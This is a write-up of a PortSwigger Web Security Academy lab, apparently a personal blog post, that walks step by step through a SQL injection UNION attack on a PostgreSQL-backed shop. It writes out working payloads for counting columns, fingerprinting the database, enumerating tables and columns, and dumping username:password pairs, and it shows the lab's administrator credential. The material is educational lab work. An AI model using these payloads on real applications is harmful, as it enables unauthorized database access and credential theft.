<h3> Portswigger Web Security </h3>

SQL injection UNION attack, retrieving multiple values in a single column

First after going over to the web app it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f58a051f-87f6-4ac9-8270-14b12cfc5b96)

After playing around I found the vulnerable part of the web app
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca08f318-b5d0-4d18-a021-82961ca3d042)

But when I add SQl comment it doesn't show internal server error 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1d0fef12-78fc-4434-af7d-53d787769a06)

So first let us determine the number columns present using *ORDER BY* query
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4e3f8c8-f835-4dd6-aefc-0a69c0a0ba42)

```
Query: ' ORDER BY 2 --
```

I got it as two. Now we need to know the part of the column that can accept data string
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/67cf009d-c9db-4d50-a021-fe4143627b73)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/47fd88ef-3ad2-4992-9001-a45f24f15814)

```
Query: ' UNION SELECT NULL,'test' --
```

Cool it's column two 

Lets see what type of DB we're working with
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f7091f5d-1912-471e-838b-4d327a74e3e6)

```
Query: ' UNION SELECT NULL, version() --
PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
```

Interesting... Lets enumerate the table name 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/448cee93-8345-40ac-ac90-fa5448e0bbcf)

```
Query: ' UNION SELECT NULL,table_name FROM information_schema.tables--
```

The users table looks interesting ... Lets get the column names
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/35919c7a-2da5-4b1f-9f1d-edc02f794782)

```
Query: ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users'--
```

The aim of this challenge is to login as admin so we need to dump the username and password column from the users table

We can dump it column by column but that's no fun

Since we know the db is postgresql a way to concatenate string is using * 'foo' || 'bar'*

So to dump the table I'll use this

```
Query: ' UNION SELECT NULL,username || ':' || password FROM users --
```

Doing that dumps the table
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cec53775-07d7-465a-97a5-2342028dda1d)

Now we have the administrator cred *administrator:ghjwdq0szwng3n27u2l4*

After loggin it we solved it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/52dfa1d1-687d-4b14-80d0-442c85e0c8ae)
